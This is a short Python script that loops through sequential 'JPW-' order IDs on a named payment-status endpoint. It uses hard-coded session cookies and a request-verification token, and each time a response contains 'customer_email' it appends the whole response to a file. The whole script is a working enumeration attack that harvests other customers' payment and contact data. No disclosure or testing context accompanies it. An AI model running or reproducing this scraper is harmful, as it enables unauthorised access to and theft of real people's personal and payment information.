import requests

# Base URL and initial settings
url = "https://www.d2h.com/payment/JusPayOrderStaus"
headers = {
    "Cookie": "ApplicationGatewayAffinityCORS=2c16ced6ec50816e8fa5a7bac4061019; ApplicationGatewayAffinity=2c16ced6ec50816e8fa5a7bac4061019; ASP.NET_SessionId=lc0v0m4k13ewkadh4q44r4cl; __RequestVerificationToken=AWb2peSWy81xzAhe9TEhJUs-8CWZ4Lqjk9wcKkeaA4wUZokgE5-WVZuKCjfRzxJFy-0Cm-D09f15lqTqSrQYg8tHEiTYDTdL6EFB3DzATWI1",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Sec-Ch-Ua": '"Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
    "Content-Type": "application/json",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Gpc": "1",
    "Accept-Language": "en-GB,en;q=0.8",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive"
}

# Function to check for "customer_email" and brute-force
def check_order_status(order_id):
    params = {"orderId": order_id}
    response = requests.get(url, headers=headers, params=params)
    
    # Check for "customer_email" in response
    if "customer_email" in response.text:
        with open("user_pay_data.txt", "a") as f:
            f.write(f"{response.text}\n")
        print(f"Order ID {order_id}: Email found and saved.")
    else:
        print(f"Order ID {order_id}: No email found, brute-forcing next.")

# Bruteforce order IDs
start_id = 25430063
end_id = 25430100  # Adjust range as needed
for order_id in range(start_id, end_id):
    check_order_status(f"JPW-{order_id}")
